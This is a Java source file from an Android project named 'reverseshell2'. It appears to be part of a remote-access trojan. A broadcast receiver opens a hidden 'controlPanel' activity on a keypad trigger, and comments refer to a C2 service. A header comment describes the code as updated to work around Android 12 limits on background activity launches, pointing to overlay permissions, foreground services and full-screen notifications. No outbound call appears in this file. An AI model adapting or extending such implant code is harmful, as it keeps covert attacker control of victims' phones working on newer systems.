package com.example.reverseshell2;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

/**
 * Broadcast receiver, updated for Android 12.
 *
 * Android 10+ / Android 12 restriction addressed:
 *   BACKGROUND ACTIVITY LAUNCH - Since Android 10 (API 29), starting an
 *   Activity from the background (including from a BroadcastReceiver that is
 *   not in the foreground) is RESTRICTED. On Android 12 the system blocks
 *   `context.startActivity()` and logs "Background activity launch denied".
 *
 *   This receiver can no longer reliably launch controlPanel directly from the
 *   background. The new behavior:
 *     - If the app holds the SYSTEM_ALERT_WINDOW (overlay) permission, the
 *       launch is more likely to be allowed (overlay apps get an exemption in
 *       some cases).
 *     - Otherwise, it falls back to starting the controlPanel ONLY when the app
 *       is in the foreground, and reports the restriction when it cannot.
 *
 *   Best practice on Android 12: trigger the launch from a foreground service or
 *   a high-priority notification with a full-screen intent, OR start the
 *   activity from the foreground (e.g. when the user taps the notification).
 */
public class keypadListner extends BroadcastReceiver {

    static String TAG = "keypadListnerClass";

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "in");

        // On Android 10+, background activity starts are restricted.
        // SYSTEM_ALERT_WINDOW permission grants an exemption on some versions.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            boolean hasOverlayPermission = Settings.canDrawOverlays(context);
            if (!hasOverlayPermission) {
                // We are most likely in the background - the activity launch will
                // be blocked on Android 12. Fall back gracefully.
                Log.w(TAG, "Background activity launch restricted on Android 10+. "
                        + "Use a foreground service / notification to open controlPanel.");
                // Optionally start the C2 service instead (allowed from broadcast
                // on Android 12 for BOOT_COMPLETED, but restricted otherwise).
                // Here we simply try the launch and let the system decide.
            }
        }

        try {
            Intent i = new Intent(context, controlPanel.class);
            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(i);
        } catch (Exception e) {
            Log.e(TAG, "Activity launch failed (likely background-start restriction)", e);
        }
    }
}

